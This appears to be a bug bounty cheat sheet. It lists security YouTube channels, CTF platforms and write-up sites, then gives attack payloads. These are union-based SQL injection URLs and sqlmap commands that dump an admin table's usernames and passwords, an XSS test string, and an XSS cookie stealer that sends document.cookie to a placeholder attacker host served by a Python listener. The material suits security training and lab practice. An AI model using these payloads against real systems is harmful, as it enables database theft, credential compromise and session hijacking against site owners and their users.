Youtube Channels 
--------

Bugcrowd : https://www.youtube.com/channel/UCo1NHk_bgbAbDBc4JinrXww
HackerOne : https://www.youtube.com/channel/UCsgzmECky2Q9lQMWzDwMhYw
Stok : https://www.youtube.com/channel/UCQN2DsjnYH60SFBIA6IkNwg
Nahamsec : https://www.youtube.com/channel/UCCZDt7MuC3Hzs6IH4xODLBw
The Cyber Mentor : https://www.youtube.com/channel/UC0ArlFuFYMpEewyRBzdLHiw
Bug Bounty Reports Explained : https://www.youtube.com/c/BugBountyReportsExplained

CTF
----------

CTFTime (https://ctftime.org)
CyberTalents (https://cybertalents.com)
H1 CTF (https://ctf.hacker101.com)
Hackthebox (https://www.hackthebox.eu)
TryHackMe (https://tryhackme.com)
VulnHub (https://www.vulnhub.com)
RootMe (https://www.root-me.org)
Wizard Labs (https://labs.wizard-security.net)
PentestIt (https://lab.pentestit.ru)


Bug Bounty Articles
-----------

Pentester land - https://pentester.land/list-of-bug-bounty-writeups.html
HackerOne Reports  - https://hackerone.com/hacktivity
Medium.com - https://medium.com/bugbountywriteup/tagged/bug-bounty


SQLi
-----

```http://localhost:8000/Post.php?id=7'+order+by+8+--+-```

```http://localhost:8000/Post.php?id=7'+order+by+7+--+-```

```http://localhost:8000/Post.php?id=7'+union+select+all+1,2,table_name,4,5,6,7+from information_schema.tables where table_schema=database() limit 0,1--+-```

```http://localhost:8000/Post.php?id=7'+union+select+all+1,2,group_concat(table_name),4,5,6,7+from information_schema.tables where table_schema=database()--+-```

```http://localhost:8000/Post.php?id=7'+union+select+all+1,2,group_concat(column_name),4,5,6,7+from information_schema.columns where table_name='cms_admin'--+-```

```http://localhost:8000/Post.php?id=7'+union+select+all+1,2,group_concat(username,password),4,5,6,7+from cms_admin--+-```


SQLMAP
-----------
```sqlmap -u http://localhost:8000/Post.php?id=7 --dbs```

```sqlmap -u http://localhost:8000/Post.php?id=7 -D cms_blog --tables```

```sqlmap -u http://localhost:8000/Post.php?id=7 -D cms_blog -T cms_admin --dump```



XSS
------------

```'><script>alert(document.domain)</script>```

XSS cookie stealer:
--------

Run python server : ```python3 -m http.server -m 80```

payload: ```<script>var i=new Image(); i.src="http://<ipaddress>/?cookie="+btoa(document.cookie);</script>```
